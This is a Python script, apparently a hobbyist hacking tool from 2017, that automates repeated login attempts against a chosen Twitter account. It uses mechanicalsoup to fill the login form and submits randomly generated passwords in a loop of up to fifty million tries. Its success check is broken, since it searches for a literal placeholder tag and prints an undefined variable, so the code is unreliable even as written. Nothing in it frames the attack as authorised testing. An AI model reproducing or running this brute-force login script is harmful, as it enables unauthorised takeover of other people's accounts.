import mechanicalsoup # Don’t forget to import the new module
import random

#if __name__ == “__main__”:
BLUE = '\033[94m'
RED = '\033[91m'
GREEN = '\033[32m'
CYAN = "\033[96m"
WHITE = "\033[97m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
GREY = "\033[90m"
DEFAULT = "\033[0m"

print("                                                                            ")
print("                                                                            ")
print(YELLOW+"############################################################################")
print("    _____  .__       .___                                          .__   _  ")
print("   /  _  \ |  |    __| _/____ __  _  _______  ___.__. _____   ____ |  |__   ")
print("  /  /_\  \|  |   / __ |\__   \ \/ \/ /\__  \<   |  |/     \_/ __ \|  |  \  ")
print(" /    |    \  |__/ /_/ | / __  \     /  / __ \___   |  Y Y  \  ___/|   Y  \ ")
print(" \____|__  /____/\____ |(____  /\/\_/  (____  / ____|__|_|  /\___  >___|  / ")
print("         \/           \/     \/             \/\/          \/     \/     \/  ")
print("                                                                            ")
print(MAGENTA+"		int:~ x_man_aldawaymeh  facebook:~ m3roor                      ")
print(YELLOW+"	date:~ 4/7/2017                                                    ")
print("                                                                            ")
print("############################################################################")
print("                                                                            ")
print("                                                                            ")



LOGIN = str(input(WHITE+"[+]"+RED+"User Name or id or phnumber : "))
while LOGIN == '':
	print("~~Eroor ~::~  Plz Enter Email or Id or Ph_numbe~~~ ")
	print("  ")
	LOGIN = str(input(WHITE+"[+]"+RED+"User Name or id or phnumber : "))
#wlist = str(input(WHITE+"[+]"+RED+"worlist : "))
#while wlist == '':
#	print("~~Error ~::~ You Dont Enter WList~~~")
#	print("  ")
#	wlist = str(input(WHITE+"[+]"+RED+"worlist : "))

#op = open(wlist,"r")


URL = "https://twitter.com/login"
TWITTER_NAME = "Qusay@" # without @

# Create a browser object
browser = mechanicalsoup.Browser()

# request Twitter login page
login_page = browser.get(URL)

# we grab the login form
login_form = login_page.soup.find("form", {"class":"signin"})

for PASSWORD in range(1, 50000000): 
    #PASSWORD = PASSWORD.rstrip("\n")
    PASSWORD = PASSWORD * 10
    PASSWORD = ''.join((random.choice("Qqusayw0{0}Decvbx123456789E".format(str(i))) for i in range(5,11)))
    # find login and password inputs
    login_form.find("input", {"name": "session[username_or_email]"})["value"] = LOGIN
    login_form.find("input", {"name": "session[password]"})["value"] = PASSWORD

    # submit form
    response = browser.submit(login_form, login_page.url)

    # verify we are now logged in ( get username in webpage )
    #user = response.soup.find("span", { "class" : "u-linkComplex-target" }).string
    print(BLUE+"try:: " + PASSWORD)
    for h in response.soup.findAll("TWITTER_NAME"):
        h = h.text
        if h == "TWITTER_NAMEc":
            print(RED+"the password is ::: >> "+i)
    #if TWITTER_NAME in user:
    #    print("You’re connected as " + TWITTER_NAME)
    #else:
    #   print("Not connected")
